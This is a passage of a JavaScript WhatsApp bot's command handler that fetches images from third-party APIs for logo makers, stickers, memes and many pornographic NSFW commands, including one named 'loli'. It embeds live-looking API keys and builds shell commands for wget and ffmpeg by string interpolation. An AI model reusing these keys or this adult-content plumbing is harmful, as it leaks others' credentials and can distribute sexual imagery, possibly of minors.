					buffer1 = await getBuffer(anu.result.results)
					kurr.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
					break
					case 'epepserti': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} ShinChan`)
					teksnya = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://xnxxapi.herokuapp.com/api/maker/special/epep?text=${teksnya}&apikey=xnxx`)
					buffer1 = await getBuffer(anu.result.results)
					kurr.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
					break							
// nfsw
case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=KurrXd`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await kurr.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'✗✗✗ ShinChan', imageMessage: imageMsg,
              contentText:`⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`,buttons,headerType:4}
              prep = await kurr.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              kurr.relayWAMessage(prep)
              break
                    case 'darkjokes':
                    case 'meme':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              buff = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=KurrXd`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await kurr.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'✗✗✗ ShinChan', imageMessage: imageMsg,
              contentText:`⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`,buttons,headerType:4}
              prep = await kurr.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              kurr.relayWAMessage(prep)
                    break
case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
               buff = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=KurrXd`)
                buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await kurr.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'✗✗✗ ShinChan', imageMessage: imageMsg,
              contentText:`⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`,buttons,headerType:4}
              prep = await kurr.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              kurr.relayWAMessage(prep)
        
                    break
case 'loli':
       case 'husbu':
       case 'milf':
       case 'cosplay':
       case 'wallml':
       if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = ( await kurr.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'✗✗✗ ShinChan', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await kurr.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              kurr.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
//
case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length == 0) return reply(`Example: ${prefix + command} ShinChan`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=KurrXd&text=${ini_txt}`).then((gambar) => {
                        kurr.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Follow Instagram:@quotes.thenay_`, quoted : ftrol})
                    })
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length == 0) return reply(`Example: ${prefix + command} ShinChan`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=KurrXd&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        kurr.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Follow Instagram:@quotes.thenay_`, quoted : ftrol})
                    })
                    break
case 'neko':
       case 'kanna':
       case 'sagiri':
       case 'megumin':
       case 'wallnime':
       if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              reply(mess.wait)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=KurrXd`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await kurr.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'✗✗✗ ShinChan', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await kurr.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              kurr.relayWAMessage(prep)
    
              break
       
       case 'hentai':
       if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              reply(mess.wait)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=KurrXd`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await kurr.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'✗✗✗ ShinChan', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await kurr.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              kurr.relayWAMessage(prep)
    
              break

                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length == 0) return reply(`Example: ${prefix + command} ShinChan`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=KurrXd&text=${ini_txt}`).then((gambar) => {
                        kurr.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`, quoted : ftrol})
                    })
                    break
case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length == 0) return reply(`Example: ${prefix + command} ShinChan`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=KurrXd&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        kurr.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Follow Instagram:@quotes.thenay_`, quoted : ftrol})
                    })
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length == 0) return reply(`Example: ${prefix + command} ShinChan`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=KurrXd&text=${ini_txt}`).then((gambar) => {
                        kurr.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Follow Instagram:@quotes.thenay_`, quoted : ftrol}) 
                    })
                    break
case 'quotes':
     ini_result = await fetchJson('https://xnxxapi.herokuapp.com/api/randomquote?apikey=xnxx')
     get_result = ini_result.result
        ini_txt = `${get_result.quotes}\n\n`
       ini_txt += `~ ${get_result.author}`
     reply(ini_txt)
     break					
					//menu haram
					case 'ass': 
					case 'ahegao': 
					case 'yuri2': 
					case 'panties': 					
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    ini_result = await fetchJson(`https://xnxxapi.herokuapp.com/api/nsfw/${command}?apikey=xnxx`)
     get_result = ini_result.result
        ini_img = await getBuffer(get_result)
     kurr.sendMessage(from, ini_img, image, {quoted:mek})
     break
     case 'neko2': 
     if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    ini_result = await fetchJson(`https://xnxxapi.herokuapp.com/api/nsfw/nsfwNeko?apikey=xnxx`)
     get_result = ini_result.result
        ini_img = await getBuffer(get_result)
     kurr.sendMessage(from, ini_img, image, {quoted:mek})
     break
//🐀💰 MALING
                   case 'trigger':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
					case 'sampah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
	                 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	                 owgi = await kurr.downloadAndSaveMediaMessage(ger)
	                 let aanu = await imgbb("55e7971b786836b9966eca4528210ba8", owgi)
	                let teks = `${aanu.display_url}`
                    titid = await fetchJson(`https://nekobot.xyz/api/imagegen?type=trash&url=${teks}`, {method: 'get'})
                    buffer = await getBuffer(titid.message)
					kurr.sendMessage(from, buffer, image, {quoted: mek})
                   }
              break       
		case 'gay':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'glass':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/glass?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'passed':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/passed?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'jail':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/jail?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'comrade':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/comrade?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'hijau':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu6 = `https://some-random-api.ml/canvas/green?avatar=${teks}`
					exec(`wget ${anu6} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					
					})
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'biru':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu7 = `https://some-random-api.ml/canvas/blue?avatar=${teks}`
					exec(`wget ${anu7} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					 break 
		case 'greyscale':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/greyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invert?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert_greyscale':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invertgreyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'red':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/red?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break
         case 'blurple':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'blurple2':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  kurr.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple2?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					kurr.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'wasted':
